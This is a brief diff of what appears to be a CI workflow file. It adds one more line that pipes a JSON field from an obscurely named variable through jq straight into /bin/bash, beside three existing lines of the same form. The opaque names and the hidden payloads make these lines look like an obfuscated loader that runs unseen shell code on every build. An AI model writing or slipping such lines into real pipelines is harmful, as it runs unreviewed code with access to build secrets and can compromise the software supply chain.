@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$x54" | jq -r .r3 | /bin/bash
           echo $iq00 | jq -r .a798 | /bin/bash
           echo $kiofs761 | jq -r .e4 | /bin/bash
+          echo $y5323 | jq -r .ujplt22950 | /bin/bash
 
       - name: Save archive
         if: always()
